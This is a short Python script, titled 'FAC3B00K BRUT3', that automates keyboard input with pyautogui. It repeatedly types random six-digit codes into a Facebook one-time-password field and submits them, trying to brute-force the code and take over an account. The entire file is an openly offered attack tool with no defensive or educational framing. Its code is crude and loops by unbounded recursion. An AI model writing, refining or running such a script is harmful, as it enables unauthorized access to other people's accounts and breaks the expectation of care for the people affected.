import time
from pyautogui import press, typewrite, hotkey
import random
print("FAC3B00K BRUT3\n")
print("Program Started...\n")
print("Open OTP Fileld of Facebook in browser and wait for 10 Sec")
time.sleep(10)
def crack_loop():
    #generate otp
    time.sleep(5)
    press('tab')
    press('tab')
    press('tab')
    r = random.randint(111111,999999)
    typewrite(str(r))
    print("[+] Attempt on "+str(r))
    press('enter')
    crack_loop()
def main():
    time.sleep(5)
    r = random.randint(111111,999999)
    typewrite(str(r))
    print("[+] Attempt on "+str(r))
    press('enter')
    crack_loop()
main()
